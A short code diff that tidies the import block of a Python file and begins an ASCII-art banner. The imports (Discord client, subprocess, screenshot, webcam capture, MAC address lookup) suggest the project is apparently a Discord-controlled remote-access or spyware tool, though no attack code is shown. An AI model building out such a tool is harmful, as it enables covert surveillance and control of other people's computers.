@@ -1,29 +1,20 @@
-import asyncio
 import discord
-import sys
-from settings import *
-from cv2 import VideoCapture, imwrite, CAP_DSHOW
 import os
-import discord
 import subprocess
 import requests
 import pyautogui
 import ctypes
-import sys
-from threading import Timer
+import asyncio
 from datetime import datetime
 from uuid import getnode as get_mac
-import discord
-import os
-import pyaudio
-import subprocess
-import pyautogui
-import numpy as np
-import subprocess
-import geocoder
-import socket
+from settings import *
+from cv2 import VideoCapture, imwrite, CAP_DSHOW
 
-import pyaudio
+
+
+
+
+
 
 new_ascii = """ 
  .d8888b.  888          888    888                        .d8888b.                       888 
